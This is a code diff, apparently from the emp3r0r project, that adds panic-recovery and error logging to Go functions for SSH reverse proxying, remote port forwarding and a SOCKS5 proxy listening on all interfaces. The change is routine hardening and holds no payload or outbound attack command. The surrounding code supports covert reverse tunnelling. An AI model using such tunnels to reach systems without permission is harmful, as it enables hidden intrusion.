@@ -10,6 +10,7 @@ import (
 
 	gliderssh "github.com/gliderlabs/ssh"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/txthinking/socks5"
 	"golang.org/x/crypto/ssh"
 )
@@ -72,6 +73,11 @@ func SSHReverseProxyClient(ssh_serverAddr string, // SSH server address:port
 
 	// start SOCKS5 proxy
 	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				logging.Errorf("SSHReverseProxyClient socks5 proxy panic: %v\n%s", r, util.CallStack())
+			}
+		}()
 		err = StartSocks5Proxy(fmt.Sprintf("0.0.0.0:%d", proxyPort),
 			"", socks5proxy, nil)
 		if err != nil {
@@ -125,6 +131,11 @@ func SSHRemoteFwdClient(ssh_serverAddr, password string,
 	defer cancel()
 
 	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				logging.Errorf("SSHRemoteFwdClient listener closing panic: %v\n%s", r, util.CallStack())
+			}
+		}()
 		<-ctx.Done()
 		l.Close()
 	}()
@@ -160,6 +171,11 @@ func SSHRemoteFwdClient(ssh_serverAddr, password string,
 		defer conn.Close()
 		defer logging.Warningf("%s <-> %s closed", conn.LocalAddr(), toAddr)
 		go func() {
+			defer func() {
+				if r := recover(); r != nil {
+					logging.Errorf("SSHRemoteFwdClient io.Copy panic: %v\n%s", r, util.CallStack())
+				}
+			}()
 			_, serveConn_error = io.Copy(conn, targetConn)
 			if serveConn_error != nil {
 				logging.Warningf("clientConn <- targetConn: %v", serveConn_error)
@@ -178,7 +194,14 @@ func SSHRemoteFwdClient(ssh_serverAddr, password string,
 		if l_err != nil {
 			return fmt.Errorf("SSH RemoteFwd (%s) finished with error: %v", toAddr, l_err)
 		}
-		go serveConn(inconn)
+		go func(c net.Conn) {
+			defer func() {
+				if r := recover(); r != nil {
+					logging.Errorf("SSHRemoteFwdClient serveConn panic: %v\n%s", r, util.CallStack())
+				}
+			}()
+			serveConn(c)
+		}(inconn)
 	}
 
 	return fmt.Errorf("session unexpectedly exited")
